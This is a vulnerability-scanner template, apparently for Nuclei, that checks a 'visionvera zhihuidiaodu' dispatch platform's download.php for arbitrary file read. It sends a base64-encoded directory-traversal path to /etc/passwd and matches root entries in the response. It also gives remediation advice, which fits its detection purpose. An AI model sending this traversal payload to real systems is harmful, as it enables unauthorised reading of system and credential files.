id: visionvera-zhihuidiaodu-download-php-file-read

info:
  name: visionvera zhihuidiaodu download.php 文件读取
  author: bl
  severity: high
  tags: 指挥调度管理平台
  description: |-
    该模板用于检测 visionvera zhihuidiaodu 组件中 download.php 接口的文件读取漏洞。
    攻击者可利用目录遍历技术读取服务器上的任意文件，进而获取敏感配置或凭据，风险等级取决于目标环境。
  remediation: >-
    升级到已修复版本，对路径进行规范化，并校验其是否位于允许的基础目录内；拒绝目录遍历序列，并将敏感文件放置在应用不可读取的目录中。在完成修复前限制对受影响端点的访问。
  
http:
  - method: GET
    path:
      - '{{BaseURL}}/app/recordings/download.php?a=download&type=rec&filename=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=='
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"
        part: body
